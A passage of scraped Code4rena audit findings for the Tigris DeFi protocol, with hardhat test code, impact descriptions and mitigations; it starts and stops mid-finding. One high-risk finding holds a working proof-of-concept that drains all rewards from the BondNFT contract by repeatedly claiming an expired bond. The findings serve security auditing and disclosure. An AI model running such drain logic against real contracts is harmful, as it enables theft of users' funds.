Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get(\"StableToken\");     stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);     Trading = await deployments.get(\"Trading\");     trading = await ethers.getContractAt(\"Trading\", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get(\"TradingExtension\");     tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);     const Position = await deployments.get(\"Position\");     position = await ethers.getContractAt(\"Position\", Position.address);     MockDAI = await deployments.get(\"MockDAI\");     mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);     MockUSDC = await deployments.get(\"MockUSDC\");     mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);     const PairsContract = await deployments.get(\"PairsContract\");     pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);     const Referrals = await deployments.get(\"Referrals\");     referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);     StableVault = await deployments.get(\"StableVault\");     stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);     await network.provider.send(\"evm_mine\");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get(\"TradingLibrary\");     tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {     let orderId;     let initPrice = parseEther(\"1000\");     beforeEach(async function () {       // To simpliy the problem, set fees to 0       await trading.setFees(true, 0, 0, 0, 0, 0);       await trading.setFees(false, 0, 0, 0, 0, 0);        let TradeInfo = [parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);       expect(trade.price.eq(parseEther('1000'))).to.be.true;       expect(trade.leverage.eq(parseEther('2'))).to.be.true;     });      it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666\", async function () {       // The price increases from $1000 to $2000, the old position earns $1000 profit.       // The expected PnL payout = old margin + earned profit + new margin       //                         = $500 + $1000 + $500       //                         = $2000       let addingPrice = parseEther('2000');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('1666'))).to.be.true;       expect(pnl._payout.lt(parseEther('1667'))).to.be.true;     });      it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714\", async function () {       // The price decreases from $1000 to $750, the old position losses $250.       // The expected PnL payout = old margin - loss + new margin       //                         = $500 - $250 + $500       //                         = $750       let addingPrice = parseEther('750');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('714'))).to.be.true;       expect(pnl._payout.lt(parseEther('715'))).to.be.true;     });    }); });  ```  The test result ``` Incorrect calculation of new margin price while adding position     Initial margin $500, leverage 2x, position $1000, price $1000       \u221a Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666       \u221a Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714 ```  ## Tools Used hardhat  ## Recommended Mitigation Steps Use the correct formula, the following test case is for the same above examples after fix.  ``` const { expect } = require(\"chai\"); const { deployments, ethers, waffle } = require(\"hardhat\"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require(\"constants\");  describe(\"Correct calculation of new margin price while adding position\", function () {   let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get(\"StableToken\");     stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);     Trading = await deployments.get(\"Trading\");     trading = await ethers.getContractAt(\"Trading\", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get(\"TradingExtension\");     tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);     const Position = await deployments.get(\"Position\");     position = await ethers.getContractAt(\"Position\", Position.address);     MockDAI = await deployments.get(\"MockDAI\");     mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);     MockUSDC = await deployments.get(\"MockUSDC\");     mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);     const PairsContract = await deployments.get(\"PairsContract\");     pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);     const Referrals = await deployments.get(\"Referrals\");     referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);     StableVault = await deployments.get(\"StableVault\");     stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);     await network.provider.send(\"evm_mine\");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get(\"TradingLibrary\");     tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe(\"Initial margin $500, leverage 2x, position $1000, price $1000\", function () {     let orderId;     let initPrice = parseEther(\"1000\");     beforeEach(async function () {       // To simpliy the problem, set fees to 0       await trading.setFees(true, 0, 0, 0, 0, 0);       await trading.setFees(false, 0, 0, 0, 0, 0);        let TradeInfo = [parseEther(\"500\"), MockDAI.address, StableVault.address, parseEther(\"2\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);       expect(trade.price.eq(parseEther('1000'))).to.be.true;       expect(trade.leverage.eq(parseEther('2'))).to.be.true;     });      it.only(\"Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999\", async function () {       // The price increases from $1000 to $2000, the old position earns $1000 profit.       // The expected PnL payout = old margin + earned profit + new margin       //                         = $500 + $1000 + $500       //                         = $2000       let addingPrice = parseEther('2000');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;       expect(pnl._payout.lt(parseEther('2000'))).to.be.true;     });      it.only(\"Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999\", async function () {       // The price decreases from $1000 to $750, the old position losses $250.       // The expected PnL payout = old margin - loss + new margin       //                         = $500 - $250 + $500       //                         = $750       let addingPrice = parseEther('750');       let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];       let addingMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, addingPrice, 0, 2000000000, false]         )       );       let addingSig = await node.signMessage(         Buffer.from(addingMessage.substring(2), 'hex')       );        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);        let trade = await position.trades(orderId);       let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,         trade.margin, trade.leverage, trade.accInterest);       expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;       expect(pnl._payout.lt(parseEther('750'))).to.be.true;     });    }); });  ```  The test result ``` Correct calculation of new margin price while adding position     Initial margin $500, leverage 2x, position $1000, price $1000       \u221a Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999       \u221a Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999 ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/218", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "edited-by-warden", "G-02"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Faith-G.md)."}, {"title": "Trading will not work on ethereum if USDT is used", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/198", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-07"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652   # Vulnerability details  ## Impact  Traders will not be able to: 1. Initiate a market order 2. Add margin 3. Add to position 4. initiate limit order  If USDT is set as the margin asset and protocol is deployed on ethereum.  (Note: this issue was submitted after consulting with the sponsor even though currently there are no plans to deploy the platform on ethereum)  ## Proof of Concept  `USDT` has a race condition protection mechanism on ethereum chain: It does not allow users to change the allowance without first changing the allowance to 0.   `approve` function in `USDT` on ethereum: https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code#L205 ```     function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {          // To change the approve amount you first have to reduce the addresses`         //  allowance to zero by calling `approve(_spender, 0)` if it is not         //  already 0 to mitigate the race condition described here:         //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729         require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));          allowed[msg.sender][_spender] = _value;         Approval(msg.sender, _spender, _value);     } ```  in `Trading` if users use `USDT` as margin to: 1. Initiate a market order 2. Add margin 3. Add to position 4. initiate limit order  The transaction will revert.   This is due to the the `_handleDeposit` which is called in all of the above uses.  `_handleDeposit` calls the `USDT` margin asset `approve` function with `type(uint).max`. From the second time `approve` will be called, the transaction will revert.  `_handleDeposit` in `Trading`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L652 ```     function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault , ERC20PermitData calldata _permitData, address _trader) internal { ------             IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);             IERC20(_marginAsset).approve(_stableVault, type(uint).max);             IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier); ------     } ```  ## Tools Used  VS Code  ## Recommended Mitigation Steps  No need to to approve `USDT` every time.  The protocol could: 1. Keep a record if allowance was already set on an address 2. Create an external function that can be called by the owner to approve the a token address"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/179", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-01"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/ReyAdmirado-G.md)."}, {"title": "Malicious user can steal all assets in BondNFT", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/170", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-05"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187   # Vulnerability details  ## Impact Malicious user can drain all assets in BondNFT, and other users will lose their rewards.  ## Proof of Concept When calling [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate `accRewardsPerShare`. This is because the reward after the `expireEpoch` does not belong to that expired bond and needs to be redistributed to all other bonds.  ```solidity   if (bond.expired) {       uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);       if (totalShares[bond.asset] > 0) {           accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];       }   } ```  In the current implementation of [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.  According to the formula in the above code, we can find that although each subsequent `claim()` of the expired bond will transfer 0 reward, the `accRewardsPerShare` will be updated cumulatively. Thus, the pending rewards of all other users will increase every time the expired bond is `claim()`ed.  A malicious user can exploit this vulnerability to steal all assets in BondNFT contract: 1. Create two bonds (B1, B2) with different `expireEpoch` 2. At some time after B1 has expired (B2 has not), keep calling [`Lock.claim(B1)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract. 3. Call [`Lock.claim(B2)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.  An example of such an attack: ```javascript diff --git a/test/09.Bonds.js b/test/09.Bonds.js index 16c3ff5..7c445c3 100644 --- a/test/09.Bonds.js +++ b/test/09.Bonds.js @@ -245,7 +245,90 @@ describe(\"Bonds\", function () {        await lock.connect(user).release(2);        expect(await bond.pending(1)).to.be.equals(\"999999999999999999725\"); // Negligable difference from 1000e18 due to solidity division      }); + +    it.only(\"Drain BondNFT rewards\", async function () { +      const getState = async () => { +        const balHacker= await stabletoken.balanceOf(hacker.address); +        const balLock = await stabletoken.balanceOf(lock.address); +        const balBond = await stabletoken.balanceOf(bond.address); +        const [pending1, pending2, pending3] = [await bond.pending(1), await bond.pending(2), await bond.pending(3)]; +        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3}; +      }; +      const parseEther = (v) => ethers.utils.parseEther(v.toString()); +      const gwei = parseEther(1).div(1e9); + +      // prepare tokens +      const TotalRewards = parseEther(8000); +      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards); +      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000)); +      const hacker = rndAddress; +      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700)); +      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000)); + +      // bond1 - user +      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100); +      await bond.distribute(stabletoken.address, parseEther(3800)); +      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei); +      // Skip some time +      await network.provider.send(\"evm_increaseTime\", [20*86400]); +      await network.provider.send(\"evm_mine\"); + +      // bond2 - hacker +      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10); +      // bond3 - hacker +      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100); + +      await bond.distribute(stabletoken.address, parseEther(2100)); + +      // Skip 10+ days, bond2 is expired +      await network.provider.send(\"evm_increaseTime\", [13*86400]); +      await network.provider.send(\"evm_mine\"); +      await bond.distribute(stabletoken.address, parseEther(2100)); + +      // check balances before hack +      let st = await getState(); +      expect(st.bond).to.be.equals(TotalRewards); +      expect(st.lock).to.be.equals(parseEther(3000)); +      expect(st.hacker).to.be.equals(parseEther(0+700)); +      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei); +      expect(st.pending2).to.be.closeTo(parseEther(100), gwei); +      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei); + +      // first claim of expired bond2 +      await lock.connect(hacker).claim(2); +      st = await getState(); +      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei); +      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei); +      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000)); +      expect(st.pending2).to.be.eq(parseEther(0)); +      expect(st.pending3).to.be.gt(parseEther(1000+1000)); + +      // hack +      const remainReward = st.bond; +      let pending3 = st.pending3; +      let i = 0; +      for (; remainReward.gt(pending3); i++) { +        // claim expired bond2 repeatedly +        await lock.connect(hacker).claim(2); +        // pending3 keeps increasing +        pending3 = await bond.pending(3); +      } +      console.log(`claim count: ${i}\\nremain: ${ethers.utils.formatEther(remainReward)}\\npending3: ${ethers.utils.formatEther(pending3)}\\n`); + +      // send diff, then drain rewards in bond +      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward)); +      await lock.connect(hacker).claim(3); +      st = await getState(); +      // !! bond is drained !! +      expect(st.bond).to.be.eq(0); +      // !! hacker gets all rewards !! +      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700))); +      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000)); +      expect(st.pending2).to.be.eq(0); +      expect(st.pending3).to.be.eq(0); +    });    }); +    describe(\"Withdrawing\", function () {      it(\"Only expired bonds can be withdrawn\", async function () {        await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"100\")); ```  Output: ```   Bonds     Rewards claim count: 41 remain: 7900.000000000000000002 pending3: 8055.7342616570405578        \u2713 Drain BondNFT rewards    1 passing (4s)  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps I recommend that an expired bond should be forced to `release()`, `claim()` an expired bond should revert.  Sample code:  ```solidity  diff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol index 33a6e76..77e85ae 100644 --- a/contracts/BondNFT.sol +++ b/contracts/BondNFT.sol @@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {          amount = bond.amount;          unchecked {              totalShares[bond.asset] -= bond.shares; -            (uint256 _claimAmount,) = claim(_id, bond.owner); +            (uint256 _claimAmount,) = _claim(_id, bond.owner);              amount += _claimAmount;          }          asset = bond.asset; @@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {          _burn(_id);          emit Release(asset, lockAmount, _owner, _id);      } +      /** -     * @notice Claim rewards from a bond +     * @notice Claim rewards from an unexpired bond       * @dev Should only be called by a manager contract       * @param _id ID of the bond to claim rewards from       * @param _claimer address claiming rewards @@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {      function claim(          uint _id,          address _claimer +    ) public onlyManager() returns(uint amount, address tigAsset) { +        Bond memory bond = idToBond(_id); +        require(!bond.expired, \"expired\"); +        return _claim(_id, _claimer); +    } + +    /** +     * @notice Claim rewards from a releasing bond or an unexpired bond +     * @param _id ID of the bond to claim rewards from +     * @param _claimer address claiming rewards +     * @return amount amount of tigAsset claimed +     * @return tigAsset tigAsset token address +     */ +    function _claim( +        uint _id, +        address _claimer      ) public onlyManager() returns(uint amount, address tigAsset) {          Bond memory bond = idToBond(_id);          require(_claimer == bond.owner, \"!owner\"); ```  "}, {"title": "BondNFTs can revert when transferred", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/162", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-06"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329   # Vulnerability details  ## Impact  `BondNFT`s should be transferrable. According the the proposal and the sponsor, `BondNFT`s should could be sold and borrowed against. The proposal for context: https://gov.tigris.trade/#/proposal/0x2f2d1d63060a4a2f2718ebf86250056d40380dc7162fb4bf5e5c0b5bee49a6f3  The current implementation limits selling/depositing to only the same day that rewards are distributed for the `tigAsset` of the bond.  The impact if no rewards are distributed in the same day:  1. `BondNFT`s listed on open markets will not be able to fulfil the orders 2. `BondNFT`s deposited as collateral will not be release the collateral  Because other market/platforms used for selling/depositing will not call `claimGovFees` to distribute rewards, they will revert when trying to transfer the `BondNFT`.  Realistic examples could be `BondNFT`s listed on opensea.   Example of reasons why rewards would not be distributed in the same day: 1. Low activity from investors, rewards are distirbuted when users lock/release/extend 2. `tigAsset` is blacklisted in `BondNFT`, rewards will not be distributed in such case.   ## Proof of Concept  `BondNFT` has a mechanism to update the time `tigAsset` rewards are distributed. It uses a map that points to the last timestamp rewards were distributed for `epoch[tigAsset]`.   `distribute` function in `BondNFT`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L221 ```     function distribute(         address _tigAsset,         uint _amount     ) external {         if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;         IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);         unchecked {             uint aEpoch = block.timestamp / DAY;             if (aEpoch > epoch[_tigAsset]) {                 for (uint i=epoch[_tigAsset]; i<aEpoch; i++) {                     epoch[_tigAsset] += 1;                     accRewardsPerShare[_tigAsset][i+1] = accRewardsPerShare[_tigAsset][i];                 }             }             accRewardsPerShare[_tigAsset][aEpoch] += _amount * 1e18 / totalShares[_tigAsset];         }         emit Distribution(_tigAsset, _amount);     } ``` (Please not that if the asset is blacklisted through `allowedAsset` the  `epoch[tigAsset]` will not be updated)  When `BondNFT`s are transfered, a check is implemented to make sure `epoch[tigAsset]` is updated to the current day.  According to the sponsor the reason for this check is to make sure that a bond that should be expired doesn't get transferred while the epoch hasn't yet been updated.  `_transfer` function in `BondNFT`: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L329 ```     function _transfer(         address from,         address to,         uint256 _id     ) internal override {         Bond memory bond = idToBond(_id);         require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");         require(!bond.expired, \"Expired!\");         unchecked {             require(block.timestamp > bond.mintTime + 300, \"Recent update\");             userDebt[from][bond.asset] += bond.pending;             bondPaid[_id][bond.asset] += bond.pending;         }         super._transfer(from, to, _id);     } ```  As can be seen above, if `epoch[tigAsset]` is not set to the same day of the transfer, the transfer will fail and the impacts in the impact section will happen.   ### Hardhat POC  There is already an implemented test showing that transfers fail when `epoch[tigAsset]` is not updated: https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/test/09.Bonds.js#L472 ```     it(\"Bond can only transferred if epoch is updated\", async function () {       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"3000\"));       await lock.connect(owner).lock(StableToken.address, ethers.utils.parseEther(\"3000\"), 365);        await network.provider.send(\"evm_increaseTime\", [864000]);       await network.provider.send(\"evm_mine\");        await expect(bond.connect(owner).safeTransferMany(user.address, [1])).to.be.revertedWith(\"Bad epoch\");     }); ```  ## Tools Used  VS Code, Hardhat  ## Recommended Mitigation Steps  The reason for the check is to validate that a bond.expired updated according to the actual timestamp. Instead of having  ```         require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");         require(!bond.expired, \"Expired!\"); ```  You could replace it with: ```  require(bond.expireEpoch  >= block.timestamp/DAY, \"Transfer after expired not allowed\"); ``` "}, {"title": "Failure in `endpoint` can cause minting more than one NFT with the same token id in different chains", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/150", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "edited-by-warden", "M-05"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168   # Vulnerability details  ## Impact  In the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that: >NFT holders only earn the profits generated by the platform on the chain that the NFT is on.  It is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to have more than one NFT with the same token id on different chains.  ## Proof of Concept   - Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A. https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124  - The `endpoint` is responsible to complete the bridging task on chain A.  - Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful. ``` function lzReceive(         uint16 _srcChainId,         bytes memory _srcAddress,         uint64 _nonce,         bytes memory _payload     ) external override {         require(_msgSender() == address(endpoint), \"!Endpoint\");         (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, 